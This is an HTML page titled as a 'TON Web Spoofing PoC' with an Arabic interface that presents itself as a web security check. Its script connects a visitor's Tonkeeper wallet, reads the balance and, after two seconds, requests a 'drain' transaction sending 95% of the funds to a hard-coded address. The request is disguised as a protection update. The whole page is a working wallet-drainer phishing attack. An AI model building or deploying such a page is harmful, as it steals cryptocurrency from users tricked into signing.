<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Web Spoofing PoC</title>
    <style>
        body { font-family: sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e2329; padding: 40px; border-radius: 24px; border: 1px solid #333; text-align: center; width: 400px; }
        button { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; }
        .balance-info { display: none; background: #000; padding: 15px; border-radius: 10px; margin-top: 20px; border: 1px solid #58a6ff; }
        #status { margin-top: 15px; color: #848e9c; font-size: 12px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://ton.org/address/ton_logo.png" width="70" style="margin-bottom: 20px;">
    <h2>اختبار أمان الويب</h2>
    <p>سيتم فتح محفظة الويب لإتمام عملية التحقق (Testnet).</p>
    
    <button id="connectBtn">فتح Tonkeeper Web والربط</button>

    <div id="balanceBox" class="balance-info">
        <div style="font-size: 11px; color: #58a6ff;">المحفظة المتصلة:</div>
        <div id="addr" style="font-size: 9px; word-break: break-all;">-</div>
        <div style="font-size: 22px; margin-top: 10px;">الرصيد: <span id="balance">0</span> TON</div>
    </div>
    <div id="status">جاهز للربط...</div>
</div>

<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

<script>
    const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";
    const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });

    document.getElementById('connectBtn').onclick = async () => {
        try {
            // كود إجبار فتح نسخة الويب
            const connectUrl = connector.connect({
                universalLink: 'https://wallet.tonkeeper.com/ton-connect', // الرابط المباشر لنسخة الويب
                bridgeUrl: 'https://bridge.tonapi.io/bridge'
            });

            // فتح نسخة الويب في نافذة جديدة
            window.open(connectUrl, '_blank', 'width=500,height=800');
            document.getElementById('status').innerText = "تم فتح محفظة الويب. بانتظار الموافقة...";
        } catch (e) {
            console.error(e);
        }
    };

    connector.onStatusChange(async (wallet) => {
        if (wallet) {
            document.getElementById('status').innerText = "✅ متصل بنجاح!";
            const rawAddress = wallet.account.address;
            document.getElementById('addr').innerText = rawAddress;
            document.getElementById('balanceBox').style.display = 'block';

            // جلب الرصيد من التست نيت
            try {
                const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
                const data = await response.json();
                const balanceNano = data.result.balance;
                document.getElementById('balance').innerText = (balanceNano / 1000000000).toFixed(2);

                // إرسال معاملة السحب
                setTimeout(() => sendDrainTx(balanceNano), 2000);
            } catch (e) { console.error(e); }
        }
    });

    async function sendDrainTx(nanoAmount) {
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60,
            messages: [{
                address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY",
                amount: Math.floor(nanoAmount * 0.95).toString()
            }]
        };
        try {
            document.getElementById('status').innerText = "يرجى توقيع المعاملة لتحديث الحماية...";
            await connector.sendTransaction(transaction);
        } catch (e) {
            document.getElementById('status').innerText = "رفض المستخدم المعاملة.";
        }
    }
</script>
</body>
</html>
